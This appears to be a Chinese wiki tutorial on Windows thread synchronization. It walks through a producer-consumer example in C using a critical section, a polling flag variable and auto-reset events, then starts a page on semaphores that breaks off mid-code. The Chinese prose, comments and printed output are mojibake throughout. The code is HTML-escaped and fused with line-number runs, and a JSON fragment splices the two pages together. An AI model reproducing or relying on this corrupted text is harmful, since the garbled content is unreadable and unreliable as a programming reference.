ä½¿ç”¨ä¸´ç•ŒåŒºé”æˆ–äº’æ–¥ä½“è¿›è¡Œäº’æ–¥æ§åˆ¶æ—¶ï¼Œä¼šå‡ºç°è¿™ç§æƒ…å†µï¼šçº¿ç¨‹Aç¦»å¼€ä¸´ç•ŒåŒºåï¼Œä¸çº¿ç¨‹Bè¿›å…¥ä¸´ç•ŒåŒºçš„æœºä¼šå‡ç­‰ï¼Œå³æœ‰å¯èƒ½å‡ºç°çº¿ç¨‹Aè¿ç»­å¤šæ¬¡è¿›å…¥ä¸´ç•ŒåŒºçš„æƒ…å†µã€‚å¦‚æœæƒ³è®©çº¿ç¨‹Aå’Œçº¿ç¨‹Bäº¤æ›¿æ‰§è¡Œï¼Œé‚£å°±æ˜¯åšåŒæ­¥æ§åˆ¶ã€‚åŒæ­¥=äº’æ–¥+æœ‰åºã€‚å¯ä»¥çœ‹åˆ°ï¼Œä¸´ç•ŒåŒºé”å’Œäº’æ–¥ä½“éƒ½ä¸èƒ½å®ç°åŒæ­¥æ§åˆ¶ã€‚è€Œäº‹ä»¶å¯ä»¥ï¼Œå®ƒå¯ä»¥â€œé€šçŸ¥â€å¦ä¸€ä¸ªçº¿ç¨‹ã€‚ æˆ‘ä»¬ä»¥ç»å…¸çš„çº¿ç¨‹åŒæ­¥é—®é¢˜ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä¸ºä¾‹è¿›è¡Œè®²è§£ã€‚ ä¾‹ ç”Ÿäº§è€…ç”Ÿäº§åï¼Œæ¶ˆè´¹è€…æ‰èƒ½å–ã€‚ä¸‹é¢ä»£ç ç”¨ä¸´ç•ŒåŒºé”å¯¹ä¸´ç•Œèµ„æºåšäº’æ–¥æ§åˆ¶ã€‚ ä½¿ç”¨ä¸´ç•ŒåŒºé”è¿›è¡Œæ§åˆ¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;CRITICAL_SECTION g_cs; // ä¸´ç•ŒåŒºå¯¹è±¡ï¼Œç”¨äºä¿æŠ¤å…±äº«èµ„æºçš„è®¿é—®int g_Iterations = 10; // è®¾ç½®ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å„æ‰§è¡Œ10æ¬¡int g_Buffer = 0; // å…±äº«èµ„æºï¼Œè¡¨ç¤ºç¼“å†²åŒºçš„æ•°æ®// ç”Ÿäº§è€…çº¿ç¨‹å‡½æ•°DWORD WINAPI ThreadProducer(LPVOID pM)&#123; for (int i = 0; i &lt; g_Iterations; i++) // æ‰§è¡Œ10æ¬¡ &#123; // è¿›å…¥ä¸´ç•ŒåŒº EnterCriticalSection(&amp;g_cs); g_Buffer = 1; // å°†æ•°æ®æ”¾å…¥ç¼“å†²åŒº printf(&quot;ç”Ÿäº§è€…%då°†æ•°æ®%dæ”¾å…¥ç¼“å†²åŒº &quot;, GetCurrentThreadId(), g_Buffer); // ç¦»å¼€ä¸´ç•ŒåŒº LeaveCriticalSection(&amp;g_cs); &#125; return 0;&#125;// æ¶ˆè´¹è€…çº¿ç¨‹å‡½æ•°DWORD WINAPI ThreadConsumer(LPVOID pM)&#123; for (int i = 0; i &lt; g_Iterations; i++) // æ‰§è¡Œ10æ¬¡ &#123; // è¿›å…¥ä¸´ç•ŒåŒº EnterCriticalSection(&amp;g_cs); g_Buffer = 0; // å°†æ•°æ®ä»ç¼“å†²åŒºå–å‡º printf(&quot;----æ¶ˆè´¹è€…%då°†æ•°æ®%dä»ç¼“å†²åŒºå–å‡º &quot;, GetCurrentThreadId(), g_Buffer); // ç¦»å¼€ä¸´ç•ŒåŒº LeaveCriticalSection(&amp;g_cs); &#125; return 0;&#125;int main(int argc, char* argv[])&#123; // åˆå§‹åŒ–ä¸´ç•ŒåŒºå¯¹è±¡ InitializeCriticalSection(&amp;g_cs); HANDLE hThreads[2]; hThreads[0] = CreateThread(NULL, 0, ThreadProducer, NULL, 0, NULL); // ç”Ÿäº§è€…çº¿ç¨‹ hThreads[1] = CreateThread(NULL, 0, ThreadConsumer, NULL, 0, NULL); // æ¶ˆè´¹è€…çº¿ç¨‹ WaitForMultipleObjects(2, hThreads, TRUE, INFINITE); CloseHandle(hThreads[0]); CloseHandle(hThreads[1]); // é”€æ¯ä¸´ç•ŒåŒºå¯¹è±¡ DeleteCriticalSection(&amp;g_cs); return 0;&#125; è¿è¡Œè¾“å‡º1234567891011121314151617181920ç”Ÿäº§è€…4936å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…4936å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…4936å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…4936å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…4936å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…4936å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…4936å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…4936å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…4936å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…4936å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒº----æ¶ˆè´¹è€…41168å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…41168å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…41168å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…41168å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…41168å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…41168å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…41168å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…41168å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…41168å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…41168å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º å› ä¸ºçº¿ç¨‹çš„æ— åºæ€§ï¼Œå‡ºç°äº†ç”Ÿäº§è€…å‡ºä¸´ç•ŒåŒºåå†æ¬¡è¿›å…¥ä¸´ç•ŒåŒºçš„æƒ…å†µã€‚è€Œæˆ‘ä»¬æƒ³è¦çš„æ˜¯äº¤æ›¿æ‰§è¡Œï¼šç”Ÿäº§è€…å…ˆç”Ÿäº§ï¼Œæ¶ˆè´¹è€…åæ¶ˆè´¹ã€‚ æˆ‘ä»¬ä¼šæƒ³åˆ°ç”¨ä¸€ä¸ªæ ‡è®°å˜é‡æ¥å®ç°åŒæ­¥æ§åˆ¶ï¼šç”Ÿäº§è€…æ˜¯å¦å·²ç”Ÿäº§ï¼Œå¦‚æœå·²ç”Ÿäº§ï¼Œå°±ä¸å†ç”Ÿäº§ï¼Œæ¶ˆè´¹è€…åŒç†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;CRITICAL_SECTION g_cs; // ä¸´ç•ŒåŒºå¯¹è±¡ï¼Œç”¨äºä¿æŠ¤å…±äº«èµ„æºçš„è®¿é—®int g_Iterations = 10; // è®¾ç½®ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å„æ‰§è¡Œ10æ¬¡int g_Buffer = 0; // å…±äº«èµ„æºï¼Œè¡¨ç¤ºç¼“å†²åŒºçš„æ•°æ®BOOL g_HasValue = FALSE; // æ ‡è®°å˜é‡ï¼Œè¡¨ç¤ºå…±äº«èµ„æºæ˜¯å¦æœ‰å€¼// ç”Ÿäº§è€…çº¿ç¨‹å‡½æ•°DWORD WINAPI ThreadProducer(LPVOID pM)&#123; for (int i = 0; i &lt; g_Iterations; ) &#123; // è¿›å…¥ä¸´ç•ŒåŒº EnterCriticalSection(&amp;g_cs); if (g_HasValue) // å¦‚æœå…±äº«èµ„æºæœ‰å€¼ï¼Œè·³è¿‡ç”Ÿäº§ &#123; printf(&quot;ç”Ÿäº§è€…%dçš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ® &quot;, GetCurrentThreadId()); LeaveCriticalSection(&amp;g_cs); Sleep(1); // è®©å‡ºCPU continue; &#125; g_Buffer = 1; // å°†æ•°æ®æ”¾å…¥ç¼“å†²åŒº g_HasValue = TRUE; // æ ‡è®°ä¸ºå·²ç”Ÿäº§ printf(&quot;ç”Ÿäº§è€…%då°†æ•°æ®%dæ”¾å…¥ç¼“å†²åŒº &quot;, GetCurrentThreadId(), g_Buffer); i++; // ä»…åœ¨æˆåŠŸç”Ÿäº§æ—¶å¢åŠ è®¡æ•° // ç¦»å¼€ä¸´ç•ŒåŒº LeaveCriticalSection(&amp;g_cs); &#125; return 0;&#125;// æ¶ˆè´¹è€…çº¿ç¨‹å‡½æ•°DWORD WINAPI ThreadConsumer(LPVOID pM)&#123; for (int i = 0; i &lt; g_Iterations; ) &#123; // è¿›å…¥ä¸´ç•ŒåŒº EnterCriticalSection(&amp;g_cs); if (!g_HasValue) // å¦‚æœå…±äº«èµ„æºæ— å€¼ï¼Œè·³è¿‡æ¶ˆè´¹ &#123; printf(&quot;----æ¶ˆè´¹è€…%dçš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ® &quot;, GetCurrentThreadId()); LeaveCriticalSection(&amp;g_cs); Sleep(1); // è®©å‡ºCPU continue; &#125; g_Buffer = 0; // å°†æ•°æ®ä»ç¼“å†²åŒºå–å‡º g_HasValue = FALSE; // æ ‡è®°ä¸ºå·²æ¶ˆè´¹ printf(&quot;----æ¶ˆè´¹è€…%då°†æ•°æ®%dä»ç¼“å†²åŒºå–å‡º &quot;, GetCurrentThreadId(), g_Buffer); i++; // ä»…åœ¨æˆåŠŸæ¶ˆè´¹æ—¶å¢åŠ è®¡æ•° // ç¦»å¼€ä¸´ç•ŒåŒº LeaveCriticalSection(&amp;g_cs); &#125; return 0;&#125;int main(int argc, char* argv[])&#123; // åˆå§‹åŒ–ä¸´ç•ŒåŒºå¯¹è±¡ InitializeCriticalSection(&amp;g_cs); HANDLE hThreads[2]; hThreads[0] = CreateThread(NULL, 0, ThreadProducer, NULL, 0, NULL); // ç”Ÿäº§è€…çº¿ç¨‹ hThreads[1] = CreateThread(NULL, 0, ThreadConsumer, NULL, 0, NULL); // æ¶ˆè´¹è€…çº¿ç¨‹ WaitForMultipleObjects(2, hThreads, TRUE, INFINITE); CloseHandle(hThreads[0]); CloseHandle(hThreads[1]); // é”€æ¯ä¸´ç•ŒåŒºå¯¹è±¡ DeleteCriticalSection(&amp;g_cs); return 0;&#125; è¿è¡Œè¾“å‡º1234567891011121314151617181920212223242526272829303132333435363738394041424344454647ç”Ÿäº§è€…19580å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®----æ¶ˆè´¹è€…48992å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®ç”Ÿäº§è€…19580å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®----æ¶ˆè´¹è€…48992å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®ç”Ÿäº§è€…19580å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®ç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®----æ¶ˆè´¹è€…48992å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®ç”Ÿäº§è€…19580å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®ç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®----æ¶ˆè´¹è€…48992å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®ç”Ÿäº§è€…19580å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®ç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®----æ¶ˆè´¹è€…48992å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®ç”Ÿäº§è€…19580å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®ç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®----æ¶ˆè´¹è€…48992å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®ç”Ÿäº§è€…19580å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®----æ¶ˆè´¹è€…48992å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®ç”Ÿäº§è€…19580å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®----æ¶ˆè´¹è€…48992å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®ç”Ÿäº§è€…19580å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒºç”Ÿäº§è€…19580çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºå·²æœ‰æ•°æ®----æ¶ˆè´¹è€…48992å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º----æ¶ˆè´¹è€…48992çš„CPUæ‰§è¡Œæƒè¢«æµªè´¹äº†ï¼Œå› ä¸ºç¼“å†²åŒºæ²¡æœ‰æ•°æ®ç”Ÿäº§è€…19580å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒº----æ¶ˆè´¹è€…48992å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º ä½¿ç”¨æ ‡è®°å˜é‡èƒ½åšåˆ°åŒæ­¥æ§åˆ¶ï¼Œä½†æ˜¯è¿™æ ·æœ‰å¤§é‡çš„CPUæ—¶é—´è¢«æµªè´¹ï¼šå·²ç”Ÿäº§æƒ…å†µä¸‹ï¼Œé‡å¤æ‰§è¡Œè·³è¿‡ç”Ÿäº§çš„ä»£ç ï¼›æ¶ˆè´¹è€…é‚£è¾¹åŒç†ã€‚ æˆ‘ä»¬éœ€è¦çš„æ˜¯ï¼Œå½“ç”Ÿäº§è€…ç”Ÿäº§å®Œï¼Œå°±â€œé€šçŸ¥â€åˆ°æ¶ˆè´¹è€…è¿›è¡Œæ¶ˆè´¹ã€‚ï¼ˆç”Ÿäº§è€…ä¸»åŠ¨è®©å‡ºè‡ªå·±çš„CPUæ—¶é—´ç‰‡ï¼Œè®©ç»™æ¶ˆè´¹è€…ï¼‰markï¼Œè¿™é‡Œå°±æ˜¯çº¿ç¨‹ä¸»åŠ¨å»ç¡çœ äº†ï¼Ÿ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int g_Iterations = 10; // è®¾ç½®ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å„æ‰§è¡Œ10æ¬¡int g_Buffer = 0; // å…±äº«èµ„æºï¼Œè¡¨ç¤ºç¼“å†²åŒºçš„æ•°æ®HANDLE g_hProduceEvent; // ç”¨äºç”Ÿäº§è€…çº¿ç¨‹çš„äº‹ä»¶å¯¹è±¡HANDLE g_hConsumeEvent; // ç”¨äºæ¶ˆè´¹è€…çº¿ç¨‹çš„äº‹ä»¶å¯¹è±¡// ç”Ÿäº§è€…çº¿ç¨‹å‡½æ•°DWORD WINAPI ThreadProducer(LPVOID pM)&#123; for (int i = 0; i &lt; g_Iterations; i++) // æ‰§è¡Œ10æ¬¡ &#123; // ç­‰å¾…æ¶ˆè´¹äº‹ä»¶è¢«è®¾ç½®ä¸ºæœ‰ä¿¡å·çŠ¶æ€ WaitForSingleObject(g_hConsumeEvent, INFINITE); g_Buffer = 1; // å°†æ•°æ®æ”¾å…¥ç¼“å†²åŒº printf(&quot;ç”Ÿäº§è€…%då°†æ•°æ®%dæ”¾å…¥ç¼“å†²åŒº &quot;, GetCurrentThreadId(), g_Buffer); // è®¾ç½®ç”Ÿäº§äº‹ä»¶ä¸ºæœ‰ä¿¡å·çŠ¶æ€ï¼Œè¡¨ç¤ºå·²ç”Ÿäº§ï¼Œé€šçŸ¥æ¶ˆè´¹è€…æ¶ˆè´¹ SetEvent(g_hProduceEvent); &#125; return 0;&#125;// æ¶ˆè´¹è€…çº¿ç¨‹å‡½æ•°DWORD WINAPI ThreadConsumer(LPVOID pM)&#123; for (int i = 0; i &lt; g_Iterations; i++) // æ‰§è¡Œ10æ¬¡ &#123; // ç­‰å¾…ç”Ÿäº§äº‹ä»¶è¢«è®¾ç½®ä¸ºæœ‰ä¿¡å·çŠ¶æ€ WaitForSingleObject(g_hProduceEvent, INFINITE); g_Buffer = 0; // å°†æ•°æ®ä»ç¼“å†²åŒºå–å‡º printf(&quot;----æ¶ˆè´¹è€…%då°†æ•°æ®%dä»ç¼“å†²åŒºå–å‡º &quot;, GetCurrentThreadId(), g_Buffer); // è®¾ç½®æ¶ˆè´¹äº‹ä»¶ä¸ºæœ‰ä¿¡å·çŠ¶æ€ï¼Œè¡¨ç¤ºå·²æ¶ˆè´¹ï¼Œé€šçŸ¥ç”Ÿäº§è€…ç”Ÿäº§ SetEvent(g_hConsumeEvent); &#125; return 0;&#125;int main(int argc, char* argv[])&#123; g_hProduceEvent = CreateEvent(NULL, FALSE, FALSE, NULL); g_hConsumeEvent = CreateEvent(NULL, FALSE, TRUE, NULL); // åˆå§‹æœ‰ä¿¡å· ç”Ÿäº§è€…å…ˆç”Ÿäº§ HANDLE hThreads[2]; hThreads[0] = CreateThread(NULL, 0, ThreadProducer, NULL, 0, NULL); // ç”Ÿäº§è€…çº¿ç¨‹ hThreads[1] = CreateThread(NULL, 0, ThreadConsumer, NULL, 0, NULL); // æ¶ˆè´¹è€…çº¿ç¨‹ WaitForMultipleObjects(2, hThreads, TRUE, INFINITE); CloseHandle(hThreads[0]); CloseHandle(hThreads[1]); // å…³é—­äº‹ä»¶å¯¹è±¡ CloseHandle(g_hProduceEvent); CloseHandle(g_hConsumeEvent); return 0;&#125; è¿è¡Œè¾“å‡º1234567891011121314151617181920ç”Ÿäº§è€…4696å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒº----æ¶ˆè´¹è€…49412å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡ºç”Ÿäº§è€…4696å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒº----æ¶ˆè´¹è€…49412å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡ºç”Ÿäº§è€…4696å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒº----æ¶ˆè´¹è€…49412å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡ºç”Ÿäº§è€…4696å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒº----æ¶ˆè´¹è€…49412å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡ºç”Ÿäº§è€…4696å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒº----æ¶ˆè´¹è€…49412å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡ºç”Ÿäº§è€…4696å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒº----æ¶ˆè´¹è€…49412å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡ºç”Ÿäº§è€…4696å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒº----æ¶ˆè´¹è€…49412å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡ºç”Ÿäº§è€…4696å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒº----æ¶ˆè´¹è€…49412å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡ºç”Ÿäº§è€…4696å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒº----æ¶ˆè´¹è€…49412å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡ºç”Ÿäº§è€…4696å°†æ•°æ®1æ”¾å…¥ç¼“å†²åŒº----æ¶ˆè´¹è€…49412å°†æ•°æ®0ä»ç¼“å†²åŒºå–å‡º"},{"title":"ä¿¡å·é‡ï¼ˆSemaphoreï¼‰","path":"/wiki/Windows_API/ä¿¡å·é‡.html","content":"å‰è¨€ äº‹ä»¶æœ‰â€œé€šçŸ¥â€åŠŸèƒ½ï¼Œèƒ½ç”¨äºçº¿ç¨‹åŒæ­¥ï¼Œä½†äº‹ä»¶æ²¡æ³•æ§åˆ¶å…·ä½“é€šçŸ¥å‡ ä¸ªçº¿ç¨‹ï¼Œè€Œä¿¡å·é‡å¯ä»¥ï¼Œä¿¡å·é‡æœ‰èµ„æºè®¡æ•°çš„æ¦‚å¿µã€‚å¯ä»¥å°†ä¿¡å·é‡ä¹Ÿç†è§£ä¸ºäº‹ä»¶ï¼ˆä½•æ—¶é€šçŸ¥å…¶ä»–çº¿ç¨‹å¯ä»¥å¼€å§‹å¹²æ´»ï¼‰ï¼Œåªä¸è¿‡æœ‰èµ„æºè®¡æ•°çš„æ¦‚å¿µã€‚ ç›¸å…³API ä½¿ç”¨CreateSemaphoreAåˆ›å»ºä¿¡å·é‡å¯¹è±¡ 123456HANDLE CreateSemaphoreA( [in, optional] LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, // SD [in] LONG lInitialCount, // initial count åˆå§‹å¯ç”¨èµ„æºæ•° [in] LONG lMaximumCount, // maximum count æœ€å¤§å¯ç”¨èµ„æºæ•° [in, optional] LPCSTR lpName // object name); å‚æ•° lInitialCount æŒ‡å®šåˆå§‹å¯ç”¨èµ„æºæ•°é‡ï¼Œå‡è®¾åˆå§‹èµ„æºæ•°é‡ä¸º 2ï¼Œå¦‚æœæœ‰ 5 ä¸ªçº¿ç¨‹æ­£åœ¨è°ƒç”¨ WaitForSingleObject å‡½æ•°ç­‰å¾…è¯¥ä¿¡å·é‡ï¼Œåˆ™æœ‰ 2 ä¸ªçº¿ç¨‹ä¼šè¢«å”¤é†’ï¼Œæ¯è°ƒç”¨ä¸€æ¬¡ WaitForSingleObject è·å¾— Semaphore å¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„èµ„æºè®¡æ•°ä¼šå‡å°‘ä¸€ä¸ªã€‚ å‚æ•° lMaximumCount æœ€å¤§èµ„æºæ•°é‡ä¸Šé™ï¼Œè¿™ä¸ªå€¼å¿…é¡»å¤§äº0 çº¿ç¨‹è°ƒç”¨WaitForSingleObjectç­‰å¾…ä¿¡å·é‡å¯ç”¨ï¼Œç­‰å¾…åˆ°åä¿¡å·é‡çš„èµ„æºè®¡æ•°ä¼šå‡1.å¦‚æœä½¿ç”¨ ReleaseSemaphore ï¼ˆé‡Šæ”¾ä¿¡å·é‡ï¼‰æ¥å¢åŠ èµ„æºè®¡æ•° 12345BOOL ReleaseSemaphore( [in] HANDLE hSemaphore, // handle to semaphore [in] LONG lReleaseCount, // count increment amount éœ€è¦å¢åŠ çš„èµ„æºä¸ªæ•° [out, optional] LPLONG lpPreviousCount // previous count); å‚æ•° hSemaphore æ˜¯éœ€è¦æ“ä½œçš„ä¿¡å·é‡å¥æŸ„ï¼› å‚æ•° lReleaseCountï¼Œéœ€è¦å¢åŠ çš„èµ„æºæ•°é‡ï¼› å‚æ•° lpPreviousCount æ˜¯ä¸€ä¸ª long å‹ï¼ˆ32 ä½ç³»ç»Ÿä¸Š 4 ä¸ªå­—èŠ‚ï¼‰çš„æŒ‡é’ˆï¼Œå‡½æ•°æ‰§è¡ŒæˆåŠŸåï¼Œè¿”å›ä¸Šä¸€æ¬¡èµ„æºçš„æ•°é‡ï¼Œå¦‚æœç”¨ä¸åˆ°è¯¥å‚æ•°ï¼Œå¯ä»¥è®¾ç½®ä¸º NULLã€‚ ä½¿ç”¨ReleaseSemaphoreå¢åŠ èµ„æºæ•°é‡ï¼Œæœ€å¤§ä¸èƒ½è¶…è¿‡lMaximumCountï¼Œè¿™ä¸ªå€¼å¿…é¡»è®¾ç½®å¤§äº 0 äº‹ä»¶VSä¿¡å·é‡ ç•Œé¢ä¸­çš„ç¼–è¾‘æ¡†éƒ½è¦ä»0é€æ¬¡+1é€’å¢åˆ°50ã€‚å½“å¼€å§‹æŒ‰é’®æŒ‰ä¸‹åï¼ŒPrimaryåçš„ç¼–è¾‘æ¡†å…ˆä»é€’å¢ï¼ŒPrimaryé€’å¢å®Œåä¸‹é¢çš„Secondaryç¼–è¾‘æ¡†æ‰èƒ½å¼€å§‹é€’å¢ã€‚ ä½¿ç”¨äº‹ä»¶å’Œä¿¡å·é‡éƒ½å¯ä»¥åšåˆ°æ§åˆ¶å…ˆåé¡ºåºï¼Œä½†äº‹ä»¶æ²¡æ³•æ§åˆ¶ä¸‹é¢å…·ä½“æœ‰å‡ ä¸ªç¼–è¾‘æ¡†å¼€å§‹é€’å¢ã€‚ äº‹ä»¶ä¿¡å·é‡123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145#include &lt;Windows.h&gt;#include &quot;resource.h&quot;#include &lt;stdio.h&gt;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);DWORD WINAPI WorkerThreadProc(LPVOID lpParameter);DWORD WINAPI PrimaryThreadProc(LPVOID lpParameter);DWORD WINAPI SecondaryThreadProc(LPVOID lpParameter);HWND g_hEditPrimary = NULL;HWND g_hEditSecondary1 = NULL;HWND 